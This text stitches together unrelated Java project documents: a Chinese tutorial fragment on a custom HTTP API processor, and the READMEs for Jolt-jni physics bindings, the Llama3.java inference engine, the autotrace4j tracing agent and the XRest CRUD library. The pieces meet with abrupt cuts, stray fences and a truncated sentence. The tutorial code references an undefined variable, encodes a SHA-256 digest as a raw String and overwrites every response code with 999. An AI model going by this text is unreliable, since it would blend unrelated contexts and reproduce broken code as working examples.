    @GetHttpInterface(""/getCityByName"")
    BaseRsp<WeatherDTO> getCityWeather(@QueryPar(""city"") String cityName);

    /**
     *  根据appId和公钥获取令牌
     */
    @PostHttpInterface(""/getToken"")
    HttpResponse<BaseRsp<TokenDTO>> getToken(@HeaderPar(""appId"") String appId, @HeaderPar(""publicKey"")String publicKey);

}

```


## 4.4、自定义HttpApiProcessor
在之前我们自定义了一个@MTuanHttpApi注解上指定了一个MTuanHttpApiProcessor，接下来我们去实现他的具体内容为了实现我们案例背景里描述的功能


```java
@Slf4j
@Component
public class MTuanHttpApiProcessor implements HttpApiProcessor<MTuanHttpApi> {

    /**
     *  渠道方分配的公钥
     */
    @Value(""${channel.mtuan.publicKey}"")
    private String publicKey;

    @Value(""${channel.mtuan.appId}"")
    private String appId;

    @Autowired
    private Environment environment;
    
    @Autowired
    private WeatherApi weatherApi;

    /** 实现-postBeforeHttpMetadata： 发送Http请求之前会回调该方法，可对Http请求体的内容进行二次处理
     *
     * @param httpMetadata              原来的请求体
     * @param methodInvocation          被代理的方法
     * @return                          新的请求体
     */
    @Override
    public HttpMetadata postBeforeHttpMetadata(HttpMetadata httpMetadata, HttpApiMethodInvocation<MTuanHttpApi> methodInvocation) {
        /**
         * 在查询参数中添加提供的appId字段
         */
        // 获取MTuanHttpApi注解
        MTuanHttpApi apiAnnotation = methodInvocation.getProxyApiAnnotation();

        // 获取MTuanHttpApi注解的appId，由于该appId是环境变量所以我们从environment中解析取出来
        String appIdVar = apiAnnotation.appId();
        appIdVar = environment.resolvePlaceholders(appIdVar);

        // 添加到查询参数中
        httpMetadata.putQueryParam(""appId"",appIdVar);

        /**
         *  生成签名sign字段
         */
        // 获取所有查询参数
        Map<String, Object> queryParam = httpMetadata.getHttpUrl().getQueryParam();

        // 获取请求体参数
        HttpBody body = httpMetadata.getBody();

        // 生成签名
        String signKey = createSignKey(queryParam,body);

        // 将签名添加到请求头中
        httpMetadata.putHeader(""sign"",signKey);

        return httpMetadata;
    }

    private String createSignKey(Map<String, Object> queryParam, HttpBody body) {
        // todo 伪代码
        // 1、将查询参数拼接成字符串
        String queryParamString = queryParam.entrySet()
                .stream().map(e -> e.getKey() + ""=""+e.getValue())
                .collect(Collectors.joining("";""));

        // 2、将请求体参数拼接成字符串
        String bodyString = """";
        if (body instanceof HttpBodyJSON){
            // application/json  类型的请求体
            bodyString = body.toStringBody();
        }else if (body instanceof HttpBodyFormData){
            // application/x-www-form-urlencoded 类型的请求体
            bodyString = body.toStringBody();
        }else if (body instanceof HttpBodyMultipart){
            // multipart/form-data 类型的请求体
            bodyString =  body.toStringBody();
        }

        // 使用公钥publicKey 加密拼接起来
        String sign = publicKey + queryParamString + bodyString;
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-256"");
            byte[] digest = md.digest(sign.getBytes());
            return new String(digest);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     *  实现-postBeforeHttpMetadata： 发送Http请求时，可定义发送请求的行为 或者打印请求和响应日志。
     */
    @Override
    public HttpResponse<?> postSendHttpRequest(HttpSender httpSender, HttpMetadata httpMetadata) {
        //  忽略 weatherApi.getToken的方法回调，否则该方法也会回调此方法会递归死循环。 或者该接口指定自定义的HttpApiProcessor重写postSendingHttpRequest
        Method getTokenMethod = ReflectionUtils.findMethod(WeatherServiceApi.class, ""getToken"",String.class,String.class);
        if (getTokenMethod == null || getTokenMethod.equals(methodInvocation.getMethod())){
            return httpSender.sendHttpRequest(httpMetadata);
        }
        
        // 1、动态获取token和sessionId
        HttpResponse<String> httpResponse = weatherApi.getToken(appId, publicKey);

        // 从响应体获取令牌token
        String token = httpResponse.getBodyResult();
        // 从响应头中获取sessionId
        String sessionId = httpResponse.getHeader(""sessionId"");

        // 把这两个值放到此次的请求cookie中
        httpMetadata.addCookie(new Cookie(""token"",token));
        httpMetadata.addCookie(new Cookie(""sessionId"",sessionId));
        
        log.info(""开始发送Http请求 请求接口:{} 请求体:{}"",httpMetadata.getHttpUrl().toUrl(),httpMetadata.toHttpProtocol());

        // 使用框架内置工具实现发送请求
        HttpResponse<?> rsp =  httpSender.sendHttpRequest(httpMetadata);

        log.info(""开始发送Http请求 响应结果:{}"",rsp.toHttpProtocol());
        
        return rsp;
    }

    /**
     *  实现-postAfterHttpResponseBodyResult： 反序列化后Http响应体的内容后回调，可对该结果进行二次处理返回
     * @param bodyResult                     Http响应体反序列化后的结果
     * @param rsp                            原始Http响应对象
     * @param method                         被代理的方法
     * @param httpMetadata                   Http请求体
     */
    @Override
    public Object postAfterHttpResponseBodyResult(Object bodyResult, HttpResponse<?> rsp, Method method, HttpMetadata httpMetadata) {
        if (bodyResult instanceof BaseRsp){
            BaseRsp baseRsp = (BaseRsp) bodyResult;
            // 设置
            baseRsp.setCode(999);
        }
        
        return bodyResult;
    }
}

```

上面我们分别重写了postBeforeHttpMetadata、postSendHttpRequest、postAfterHttpResponseBodyResult三个生命周期的钩子方法去完成我们的需求，实现他们可以方便的发送一个Http请求的
过程中去织入我们的对接行为

[The Jolt-jni Project][project] provides
[JVM] bindings for [Jolt Physics][jolt],
to facilitate physics simulation in JVM languages such as [Java] and [Kotlin].

## Translating Jolt Physics applications into Java

There’s close correspondence between the class/method names
of Jolt Physics and jolt-jni.
For example:

+ The `Body` class in jolt-jni will (eventually) provide
  all the functionality of the `Body` class in Jolt Physics.
+ The `ConstBody` interface will include all the `const` methods
  of the Jolt Physics `Body` class, such as its `GetPosition()` method,
  which in jolt-jni is called `getPosition()`.

Things become slightly more interesting when C++ templates
and public member data are involved. For instance:

+ An array of body IDs is `Array<BodyID>` in Jolt Physics;
  in jolt-jni it’s called a `BodyIdVector`.
+ The `mConvexRadius` member of the Jolt Physics `BoxShapeSettings` class
  is accessed using `getConvexRadius()` and `setConvexRadius()` in jolt-jni.

For a couple well-known Jolt Physics examples,
[line-for-line translations into Java](https://github.com/stephengold/jolt-jni/tree/master/src/test/java/testjoltjni/app)
are provided.

## How to add jolt-jni to an existing project

Jolt-jni comes pre-built as a platform-independent JVM library
plus a set of native libraries, all downloadable from Maven Central.

Current jolt-jni releases provide
the JVM library under 6 distinct names (artifact IDs).
They also provide 24 native libraries,
each specific to a particular platform, build type, and build flavor.

Your runtime classpath should include
a JVM library plus 1-to-6 native libraries:
a native library for each platform on which the code will run.

Build types:  use ""Debug"" native libraries during development,
then switch to ""Release"" libraries for performance testing and production.

Build flavors:  use ""Dp"" to simulate large worlds (>1000 meters in diameter)
otherwise use ""Sp"".

### Gradle-built projects

Add to the project’s ""build.gradle"" or ""build.gradle.kts"" file:

    repositories {
        mavenCentral()
    }
    dependencies {
        // JVM library:
        implementation(""com.github.stephengold:jolt-jni-Linux64:0.9.1"")

        // native libraries:
        runtimeOnly(""com.github.stephengold:jolt-jni-Linux64:0.9.1:DebugSp"")
        // Native libraries for other platforms could be added.
    }

+ The ""Linux64"" platform name may be replaced by ""Linux_ARM32hf"", ""Linux_ARM64"",
  ""MacOSX64"", ""MacOSX_ARM64"", or ""Windows64"".
+ The ""DebugSp"" classifier

+ For some older versions of Gradle,
  it's necessary to replace `implementation` with `compile`.

## How to build jolt-jni from source

### Initial build

1. Install a [Java Development Kit (JDK)][adoptium],
   if you don't already have one.
2. Point the `JAVA_HOME` environment variable to your JDK installation:
   (In other words, set it to the path of a directory/folder
   containing a ""bin"" that contains a Java executable.
   That path might look something like
   ""C:\Program Files\Eclipse Adoptium\jdk-17.0.3.7-hotspot""
   or ""/usr/lib/jvm/java-17-openjdk-amd64/"" or
   ""/Library/Java/JavaVirtualMachines/zulu-17.jdk/Contents/Home"" .)
  + using Bash or Zsh: `export JAVA_HOME=""` *path to installation* `""`
  + using [Fish]: `set -g JAVA_HOME ""` *path to installation* `""`
  + using Windows Command Prompt: `set JAVA_HOME=""` *path to installation* `""`
  + using PowerShell: `$env:JAVA_HOME = '` *path to installation* `'`
3. Download and extract the jolt-jni source code from GitHub:
  + using [Git]:
    + `git clone https://github.com/stephengold/jolt-jni.git`
    + `cd jolt-jni`
    + `git checkout -b latest 0.9.1`
  + using a web browser:
    + browse to [the latest release][latest]
    + follow the ""Source code (zip)"" link at the bottom of the page
    + save the ZIP file
    + extract the contents of the saved ZIP file
    + `cd` to the extracted directory/folder
4. (optional) Edit the ""gradle.properties"" file to configure the build.
5. Run the [Gradle] wrapper:
  + using Bash or Fish or PowerShell or Zsh: `./gradlew build`
  + using Windows Command Prompt: `.\gradlew build`

After a successful build,
artifacts will be found in ""build/libs"".

### Other tasks

You can run the ""hello world"" example app:
+ using Bash or Fish or PowerShell or Zsh: `./gradlew runHelloWorld`
+ using Windows Command Prompt: `.\gradlew runHelloWorld`

You can run various scenes in the ""performance test"" example app:
+ the ConvexVsMesh scene:
  + using Bash or Fish or PowerShell or Zsh: `./gradlew runConvexVsMesh`
  + using Windows Command Prompt: `.\gradlew runConvexVsMesh`
+ the Pyramid scene:
  + using Bash or Fish or PowerShell or Zsh: `./gradlew runPyramid`
  + using Windows Command Prompt: `.\gradlew runPyramid`
+ the Ragdoll scene:
  + using Bash or Fish or PowerShell or Zsh: `./gradlew runRagdoll`
  + using Windows Command Prompt: `.\gradlew runRagdoll`

You can install the artifacts to your local Maven repository:
+ using Bash or Fish or PowerShell or Zsh: `./gradlew install`
+ using Windows Command Prompt: `.\gradlew install`

You can restore the project to a pristine state:
+ using Bash or Fish or PowerShell or Zsh: `./gradlew cleanAll`
+ using Windows Command Prompt: `.\gradlew cleanAll`

<a name=""free""></a>

## Freeing native objects

In long-running applications,
it's important to free objects that are no longer in use,
lest the app run out of memory.

Here it's important to distinguish between JVM objects and native objects.
A handful jolt-jni classes are implemented entirely in Java, notably:
`Color`, `Float3`, `Plane`, `Quat`, `RVec3`, `UVec4`, `Vec3`, and `Vec4`.
Apart from these special classes,
every JVM object in jolt-jni is an instance of `JoltPhysicsObject`,
which implies it has a corresponding native object assigned to it.

For instance, when a jolt-jni app instantiates a matrix using `new Mat44()`,
both a JVM object and a native object are created.
The app can't access the native object directly;
it can only invoke methods exposed by the JVM object.

While JVM objects get reclaimed automatically
(in batches, by a garbage collector) after they become unreachable,
jolt-jni provides several mechanisms for reclaiming native objects.

In the simple case of a matrix instantiated using `matrix = new Mat44()`,
the native object can be freed:
+ explicitly using `matrix.close()`,
+ implicitly by `AutoCloseable`
  (at the end of the `try` block in which the matrix was instantiated), or
+ automatically when the corresponding JVM object is reclaimed
  (provided a cleaning task has been started
  by invoking `JoltPhysicsObject.startCleaner()`).

In native code, convention dictates that when a class allocates memory,
it assumes responsibility for freeing it.
For this reason, jolt-jni applications cannot free objects created
implicitly by Jolt Physics.

For instance, when an app invokes `getBodyLockInterface()` on a `PhysicsSystem`,
a new JVM object is returned.
However, that JVM object refers to a pre-existing native object
(the one Jolt Physics allocated while initializing the `PhysicsSystem`).
Thus the application need not (and cannot) free the native object
separately from the `PhysicsSystem` that contains it.
On such ""contained"" objects, `close()` is a no-op,
because the JVM object doesn't ""own"" its assigned native object.

Another case where a `JoltPhysicsObject` doesn't own its assigned native object
is when the object implements reference counting.
In this case, responsibility for freeing the native object (called the ""target"")
is shared among other objects (called ""references"") that refer to it.
Jolt-jni classes that implement reference counting
are exactly those that implement the `RefTarget` interface.
They include `BaseCharacter`, `Constraint`, `ConstraintSettings`,
`GroupFilter`, `PhysicsMaterial`, `PhysicsScene`, `Ragdoll`, `Shape`,
`ShapeSettings`, `VehicleController`, and all their subclasses.
On `RefTarget` objects, `close()` is (again) a no-op,
because the JVM object doesn't own its assigned native object.

The simplest way to create a reference is to invoke `target.toRef()`.
References are themselves instances of `JoltPhysicsObject`, of course.
(And please note that jolt-jni reference counting is completely orthogonal
to Java references, strong, weak, or otherwise.)

The only way to free the assigned native object of a `RefTarget`
is to decrement its reference count from one to zero.
This implies creating one or more references
and then freeing them all, either explicitly, implicitly, or automatically.

As long as a reference is active, its target cannot be freed.
Nor can a target be freed if no reference to it has been created
(because in that case its reference count is already zero).
Nor can it be freed if reference counting is disabled
by invoking `target.setEmbedded()`.

</div>

## Setup

Download pure `Q4_0` and (optionally) `Q8_0` quantized .gguf files from:
  - https://huggingface.co/mukel/Llama-3.2-1B-Instruct-GGUF
  - https://huggingface.co/mukel/Llama-3.2-3B-Instruct-GGUF
  - https://huggingface.co/mukel/Meta-Llama-3.1-8B-Instruct-GGUF
  - https://huggingface.co/mukel/Meta-Llama-3-8B-Instruct-GGUF

The pure `Q4_0` quantized models are recommended, except for the very small models (1B), please be gentle with [huggingface.co](https://huggingface.co) servers: 
```
# Llama 3.2 (3B)
curl -L -O https://huggingface.co/mukel/Llama-3.2-3B-Instruct-GGUF/resolve/main/Llama-3.2-3B-Instruct-Q4_0.gguf

# Llama 3.2 (1B)
curl -L -O https://huggingface.co/mukel/Llama-3.2-1B-Instruct-GGUF/resolve/main/Llama-3.2-1B-Instruct-Q8_0.gguf

# Llama 3.1 (8B)
curl -L -O https://huggingface.co/mukel/Meta-Llama-3.1-8B-Instruct-GGUF/resolve/main/Meta-Llama-3.1-8B-Instruct-Q4_0.gguf

# Llama 3 (8B)
curl -L -O https://huggingface.co/mukel/Meta-Llama-3-8B-Instruct-GGUF/resolve/main/Meta-Llama-3-8B-Instruct-Q4_0.gguf

# Optionally download the Q8_0 quantized models
# curl -L -O https://huggingface.co/mukel/Meta-Llama-3-8B-Instruct-GGUF/resolve/main/Meta-Llama-3-8B-Instruct-Q8_0.gguf
# curl -L -O https://huggingface.co/mukel/Meta-Llama-3.1-8B-Instruct-GGUF/resolve/main/Meta-Llama-3.1-8B-Instruct-Q8_0.gguf
```

#### Optional: quantize to pure `Q4_0` manually

In the wild, `Q8_0` quantizations are fine, but `Q4_0` quantizations are rarely pure e.g. the `token_embd.weights`/`output.weights` tensor are quantized with `Q6_K`, instead of `Q4_0`.  
A **pure** `Q4_0` quantization can be generated from a high precision (F32, F16, BFLOAT16) .gguf source 
with the `llama-quantize` utility from [llama.cpp](https://github.com/ggerganov/llama.cpp) as follows:

```bash
./llama-quantize --pure ./Meta-Llama-3-8B-Instruct-F32.gguf ./Meta-Llama-3-8B-Instruct-Q4_0.gguf Q4_0
```

## Build and run

Java 21+ is required, in particular the [`MemorySegment` mmap-ing feature](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/nio/channels/FileChannel.html#map(java.nio.channels.FileChannel.MapMode,long,long,java.lang.foreign.Arena)).

[`jbang`](https://www.jbang.dev/) is a perfect fit for this use case, just:
```
jbang Llama3.java --help
```
Or execute directly, also via [`jbang`](https://www.jbang.dev/):
```bash 
chmod +x Llama3.java
./Llama3.java --help
```

## Run from source

```bash
java --enable-preview --source 21 --add-modules jdk.incubator.vector LLama3.java -i --model Meta-Llama-3-8B-Instruct-Q4_0.gguf
```

#### Optional: Makefile + manually build and run

A simple [Makefile](./Makefile) is provided, run `make` to produce `llama3.jar` or manually:
```bash
javac -g --enable-preview -source 21 --add-modules jdk.incubator.vector -d target/classes Llama3.java
jar -cvfe llama3.jar com.llama4j.Llama3 LICENSE -C target/classes .
```

Run the resulting `llama3.jar` as follows: 
```bash
java --enable-preview --add-modules jdk.incubator.vector -jar llama3.jar --help
```

### GraalVM Native Image

Compile to native via `make` (recommended):

```bash
make native
```
Or directly:

```bash
native-image -H:+UnlockExperimentalVMOptions	-H:+VectorAPISupport -H:+ForeignAPISupport -O3 -march=native --enable-preview --add-modules jdk.incubator.vector --initialize-at-build-time=com.llama4j.FloatTensor -Djdk.incubator.vector.VECTOR_ACCESS_OOB_CHECK=0 -jar llama3.jar -o llama3
```

Run as Native Image:

```bash
./llama3 --model Llama-3.2-1B-Instruct-Q8_0 --chat
```

### AOT model preloading

`Llama3.java` supports AOT model preloading, enabling **0-overhead, instant inference, with minimal TTFT (time-to-first-token)**.

To AOT pre-load a GGUF model:
```bash
PRELOAD_GGUF=/path/to/model.gguf make native
```

A specialized, larger binary will be generated, with no parsing overhead for that particular model.
It can still run other models, although incurring the usual parsing overhead.

## Performance

GraalVM now supports more [Vector API](https://openjdk.org/jeps/469) operations. To give it a try, you need GraalVM for JDK 24 – get the EA builds from [`oracle-graalvm-ea-builds`](https://github.com/graalvm/oracle-graalvm-ea-builds) or sdkman: `sdk install java 24.ea.15-graal`.

#### llama.cpp

Vanilla `llama.cpp` built with `make`.
```bash
./llama-cli --version                                                                                                                                                                          130 ↵
version: 3862 (3f1ae2e3)
built with cc (GCC) 14.2.1 20240805 for x86_64-pc-linux-gnu
```

Executed as follows:
```bash
./llama-bench -m Llama-3.2-1B-Instruct-Q4_0.gguf -p 0 -n 128
```

#### Llama3.java

```bash
taskset -c 0-15 ./llama3 \
  --model ./Llama-3-1B-Instruct-Q4_0.gguf \
  --max-tokens 128 \
  --seed 42 \
  --stream false \
  --prompt ""Why is the sky blue?""
```

Hardware specs: 2019 AMD Ryzen 3950X 16C/32T 64GB (3800) Linux 6.6.47.

****Notes**  
*Running on a single CCD e.g. `taskset -c 0-15 ./llama3 ...` since inference is constrained by memory bandwidth.*

​	`autotrace4j`是一个基于ByteBuddy编写的轻量级日志跟踪工具，其基本逻辑是在各个上下文当中通过代码增强关键节点来传递`trace id`，最后在日志输出时注入到输出结果当中，以实现日志的跟踪串联。

​	我们借鉴了SkyWalking的实现原理，使用ByteBuddy在各个上下文环节进行关键点增强来传递Trace ID。

#### 易使用

​	基于Agent的方式来使用该工具，对业务代码无侵入。

#### 轻量级

​	只依赖ByteBuddy，且增加的增强代码只是往Thread Local当中写入字符串或读出字符串，没有做额外事项，不会增加性能开销。

## Startup

​	`autotrace4j`的使用非常简单，只需从[release](https://github.com/artlibs/autotrace4j/releases)中下载最新的agent jar包，在启动脚本中以agent方式运行：

```shell
$ java -javaagent=/dir/to/autotrace4j.jar=com.your-domain.biz1.pkg1,com.your-domain.biz2.pkg2 -jar YourJar.jar  # 省略其他无关参数
```

#### 关于`org.slf4j.MDC`

可通过slf4j的MDC获取当前上下文的TraceID：

-   当通过 `MDC.get(""X-Ato-Span-Id"")`时返回当前上下文的 `SpanId`
-   当通过 `MDC.get(""X-Ato-P-Span-Id"")`时返回当前上下文的 `ParentSpanId`
-   当通过 `MDC.get(""X-Ato-Trace-Id"")`时返回当前上下文的 `TraceId`

## Supported Context

### 1、Thread

​	针对Thread进行了增强，在创建线程时支持自动Trace跟踪:

-   `java.lang.Thread`

### 2、Thread Pool

​	基于如下包作为基础的线程池均支持自动Trace跟踪:

-   `java.util.concurrent.ThreadPoolExecutor`
-   `java.util.concurrent.ForkJoinPool`
-   `java.util.concurrent.ScheduledThreadPoolExecutor`

### 3、Http Client

​	基于如下几个Client的HTTP请求客户端在发送请求时都会自动将当前上下文的TraceId设置到请求头：

-   OkHttp3：`com.squareup.okhttp3:okhttp`
-   JDK Http Client：`jdk:sun.net.www.http.HttpClient`
-   ApacheHttpClient：`org.apache.httpcomponents:httpclient`

### 4、Http Servlet

​	我们支持了HTTP Filter和HTTP Servlet来从请求头当中接收TraceId并设置到当前上下文：

-   `javax.servlet.Filter`
-   `javax.servlet.http.HttpServlet`

### 5、MessageQunue

​	目前支持阿里云ONS和RocketMQ在生产和消费时带上TraceId：

-   RocektMQ：`Producer` & `Consumer`
-   Aliyun ONS：`Producer` & `Consumer`
-   Kafka：comming soon....

### 6、Scheduled Task

​	已支持XXL Job和Spring的Scheduled定时任务在产生时生成TraceId：

-   XxlJob Handler：`com.handler.com.xxl.job.core.IJobHandler`
- Spring Schedule Task：`org.springframework.scheduling.annotation.Scheduled`
- PowerJob Processor：`tech.powerjob.worker.core.processor.sdk.BasicProcessor`

### 7、Logging

​	目前支持在logback中输出日志时注入trace id进行输出：

-   logback：`ch.qos.logback:logback-core`

A REST accelerator library. It allows for creating CRUD Controller and express conditions in JSON notation

# Why XRest ? Another CRUD Controller ?
The available solutions on the net doesn't offer a powerful expressive way to declare the conditions. <br/>
A truly CRUD Controller, should offer:<br/>
    1. a generic based version that does the heavy workload.<br/>
    2. a fully customizable solution based on business requirements.<br/>
    3. a robust expressive way of WHERE conditions.<br/>
    4. isolate system entities from the application layer by using DTOs (input/output) for the API.

By using XRest, you will offer your project two benefits:
1. a fast way to make CRUD controller for entities. [read more](#useLibrary)
   - **/getOne**  ( condition can be passed ) <br/>
   - **/getMany** ( condition can be passed ) <br/>
   - **/count**  ( condition can be passed )<br/>

   - **/createMany** <br/>
   - **/updateOne** <br/>
   - **/updateMany** <br/>
   - **/deleteOne** <br/>
   - **/deleteMany** ( condition should be passed ) <br/>
2. support CRUD API set with JSON where condition. [read more](#expressing-where-condition)

### productivity note:
You can utilize ([xrest cli](https://github.com/sattinos/xrest.cli)) to scaffold your necessary code. 


# Prerequisites
1. Java 17 or higher ([Lebrica JDK](https://bell-sw.com/pages/downloads/#jdk-17-lts) is recommended here)
2. [Maven](https://maven.apache.org/download.cgi) 3.9.2 or higher
3. [Spring Boot](https://spring.io/projects/spring-boot) 

# Supported Database
Principally, XRest is supposed to work on any Sql-based database (PostgreSQL, MySql or Microsoft Sql Server). 

# How to start
1. In your Spring Boot project, add the following to the POM file:
```xml
<dependency>
    <groupId>io.github.sattinos</groupId>
    <artifactId>xrest</artifactId>
    <version>1.0.19</version>
    <exclusions>
        <!-- Exclude spring-boot-starter-data-jpa to avoid version conflict -->
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </exclusion>
        <!-- Exclude spring-boot-starter-web to avoid version conflict -->
        <exclusion>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </exclusion>
    </exclusions>
</dependency>
```

2. make sure you add this configuration to tell Spring to scan for XRest components:

```java
@Configuration
@ComponentScan(basePackages = ""org.malsati.xrest"")
public class ApplicationConfig {
}
```

    private String fullName;

    @Column(name = ""birth_date"")
    private LocalDate birthDate;
}
```
Notice that here no XRest base entities is used.

### <a id=""dexrest""></a> Option2: Interfaces and base entities offered by XRest:
When coming to business requirements, `Audit Info` are of three types:
1. Creation info:
    - who created the entity
    - when it has been created
2. Update info:
    - who updated the entity
    - when it has been updated
3. Delete info: (soft delete only)
    - who deleted the entity
    - when it has been deleted

`XRest` offers a list of base classes to cover this:<br/><br/>
<blockquote style=""background-color:rgb(252, 252, 252); "">

`CreateEntity`: for entities that needs only creation info of the entity.

<details>
    <summary>example:</summary>
<blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""City"")
public class City extends CreateEntity {
    private String name;
    private String isoCode;
}
```
</blockquote>
</details>
</blockquote>

<br/>

<blockquote style=""background-color:rgb(250, 250, 250); "">

`UpdateEntity`: for entities that needs only update info of the entity.

<details>
    <summary>example:</summary>
    <blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""MessageItem"")
public class MessageItem extends UpdateEntity {
    private String contents;
    private String senderName;
}
```
</blockquote>
</details>
</blockquote>

<br/>

<blockquote style=""background-color:rgb(252, 252, 252); "">

`DeleteEntity`: for entities that needs only delete info of the entity.

<details>
    <summary>example:</summary>
    <blockquote style=""background-color: transparent; "">

```java
@Data
@Entity
@Table(name = ""Color"")
public class Color extends DeleteEntity {
    private String rgbValue;
}
```
</blockquote>
</details>
</blockquote>
<br/>
<blockquote style=""background-color:rgb(250, 250, 250); "">

`AuditEntity`: for entities that needs creation info as well as update info.

Note: There are a list of Audit interfaces that are considered the contracts of auditing. They might be useful in some situations:
`CreationInfo`
`UpdateInfo`
`DeletionInfo`
`IdentityInfo`

#### Soft Delete Note:
When you want your entity to be soft-deleted, make sure you implement the interface: `DeletionInfo`.

CRUD operations will support `Soft Delete` automatically when you implement this interface.

If your entity doesn't implement this interface, `Hard Delete` will be chosen by XRest.

## <a id=""step02""></a> 2) Design CRUD endpoints DTOs 

#### CreateOne Endpoint (CreateOneInputDto, CreateOneOutputDto)

```java
@Data
@AllArgsConstructor
@NoArgsConstructor
public class CreateOneAuthorInputDto {
    private String fullName;
    private LocalDate birthDate;
    private Collection<Long> bookIds;
}
```
```java
@Data
@AllArgsConstructor
@NoArgsConstructor
public class CreateOneAuthorOutputDto extends CreateOneAuthorInputDto {
    private Long id;

    public CreateOneAuthorOutputDto(Long id, String fullName, LocalDate birthDate, Collection<Long> bookIds) {
        super(fullName, birthDate, bookIds);
        this.id = id;
    }
}
```

#### UpdateOne Endpoint (UpdateOneInputDto)
```java

public class UpdateOneAuthorInputDto extends CreateOneAuthorOutputDto implements IdentityInfo<Long> {  
}
```

### note:
When writing your `UpdateOneInputDto` you need to implement the interface `IdentityInfo` so that XRest will know how to retrieve the ID of the entity.
The ID of the entity is used by XRest to do basic validation before doing the actual update of the entity.
This validation is common to all entities though.


#### GetOne Endpoint (GetOneInputDto)
```java
public class GetOneAuthorOutputDto extends CreateOneAuthorOutputDto {
}
```

#### DeleteOne Endpoint (DeleteOneOutputDto)
```java
public class DeleteOneAuthorOutputDto extends UpdateOneAuthorInputDto {
}
```

## <a id=""step03""></a> 3) Write down your entity mapper interface
It should inherit from IMapper

```java
@Mapper(componentModel = ""spring"", nullValuePropertyMappingStrategy = NullValuePropertyMappingStrategy.IGNORE)
public interface AuthorMapper extends IMapper<Author,
        Long,
        CreateOneAuthorInputDto,
        CreateOneAuthorOutputDto,
        UpdateOneAuthorInputDto,
        DeleteOneAuthorOutputDto,
        GetOneAuthorOutputDto> {

    @Override
    @Mapping(source = ""bookIds"", target = ""books"")
    Author createOneInputDtoToEntity(CreateOneAuthorInputDto createOneAuthorInputDto);
    
    @Override
    @Named(""createOne"")
    @Mapping(source = ""books"", target = ""bookIds"")
    CreateOneAuthorOutputDto entityToCreateOneOutputDto(Author entity);
    
    @Override
    List<Author> createManyInputDtoToEntities(Iterable<CreateOneAuthorInputDto> createManyInputDto);
    
    @Override
    @IterableMapping(qualifiedByName = ""createOne"")
    List<CreateOneAuthorOutputDto> entitiesToCreateManyOutputDto(List<Author> entities);
    
    @Override
    @Mapping(source = ""bookIds"", target = ""books"")
    Author updateOneInputDtoToEntity(UpdateOneAuthorInputDto updateOneAuthorInputDto);
    
    @Override
    @Mapping(source = ""books"", target = ""bookIds"")
    DeleteOneAuthorOutputDto entityToDeleteOneOutputDto(Author entity);
    
    @Override
    List<DeleteOneAuthorOutputDto> entitiesToDeleteManyOutputDto(List<Author> entity);
    
    @Override
    @Mapping(source = ""books"", target = ""bookIds"")
    GetOneAuthorOutputDto entityToGetOneoutputDto(Author entity);

    default List<Book> mapBookIdsToBooks(Collection<Long> bookIds) {
        var books = new ArrayList<Book>(bookIds.size());
        for (Long id: bookIds) {
            books.add(new Book(id));
        }
        return books;
    }

    default List<Long> mapBooksToBookIds(Collection<Book> books) {
        var bookIds = new ArrayList<Long>(books.size());
        for (var book: books) {
            bookIds.add(book.getId());
        }
        return bookIds;
    }
}
```

[Show me how (first case)](src/test/java/org/malsati/simple_web_app/mapper/AuthorMapper.java) <br />
[Show me how (second case)](src/test/java/org/malsati/simple_web_app/mapper/BookMapper.java)

[back to main steps](#howtouse)

## <a id=""step04""></a> 4) Design your repository
Make sure you inherit from `JpaRepository` as well as `JpaSpecificationExecutor` :
```java
public interface AuthorRepository extends JpaRepository<Author, Long>, JpaSpecificationExecutor<Author> {    
}
```

[back to main steps](#howtouse)

## <a id=""step05""></a> 5) Write down your service class:
1. It should extend CrudServiceORM
2. In its constructor, it should inject the entity
   repository and the mapper you've created in previous steps.
3. Implement the validation methods `validateCreateOneInput` and `validateUpdateOneInput` if needed (optional)
4. Implement the hooks `onPreCreateOne`, `onPreUpdateOne` and `onPreDeleteOne` if needed (optional)

[Show me how (first case)](src/test/java/org/malsati/simple_web_app/service/AuthorsService.java) <br />
[Show me how (second case)](src/test/java/org/malsati/simple_web_app/service/BookService.java)


```java
@Service
public class AuthorsService extends CrudServiceORM<
        Author,
        Long,
        CreateOneAuthorInputDto,
        CreateOneAuthorOutputDto,
        UpdateOneAuthorInputDto,
        DeleteOneAuthorOutputDto,
        GetOneAuthorOutputDto> {
    
    public AuthorsService(
            AuthorRepository authorRepository,
            AuthorMapper mapper) {
        super(authorRepository, mapper);
    }   
}
```
[back to main steps](#howtouse)

## <a id=""step06""></a> 6) Write your CRUD Controller:  
1. It should inherit from CRUDController<br/>
2. It should pass the service class you've created in previous step

```java
@RequestMapping(""/app/author"")
@RestController
public class AuthorsController extends CrudController<Author,
        Long,
        CreateOneAuthorInputDto,
        CreateOneAuthorOutputDto,
        UpdateOneAuthorInputDto,
        DeleteOneAuthorOutputDto,
        GetOneAuthorOutputDto> {
    
    public AuthorsController(AuthorsService authorsService) {
        super(authorsService);
    }
}
```

# How to test 
```bash
mvn test
```

while testing the project, I recommend you test using the test runner of IntelliJ Idea Community Edition.
Each test case will output explanatory messages. Run the tests from the Test Suite [ContollersTestsSuite](src/test/java/org/malsati/controllers_test/ContollersTestsSuite.java) 

### About testing project:
It is a Spring Boot web app, that starts the journey with you:
1. How to Design an entity in both ways (utilize XRest Base classes, and freely design your entity).
2. Shows how to design DTO classes.
3. Shows how to write mapper.
4. Shows how to write your repository classes.
5. Shows how to write your custom service classes and write custom business validation rules as well as create/update/delete hooks.
6. Shows you the power of `JSON Condition` and how to pass it to the API.
7. Shows how to write your controller classes.
8. Shows how to form `JSON Condition` in case of relation (ONE-TO-ONE, ONE-TO-MANY, MANY-TO-MANY). 

The test project test cases:
1. AuthorControllerTest it has 16 test cases. It shows how to utilize XRest base entities.
2. BookControllerTest it has 13 test cases. It show how your freely designed entities fit into XRest.
3. AuthorAndBookControllerTest it has 3 test cases mainly for how to deal with relation.

If you have further test cases that needs to be addressed, just drop me an email or open an issue.

[The test project source code](src/test/java/org/malsati/controllers_test/ContollersTestsSuite.java)


## Expressing Where Condition
The Where condition is in JSON notation. It allows you to express a business filter in JSON format.
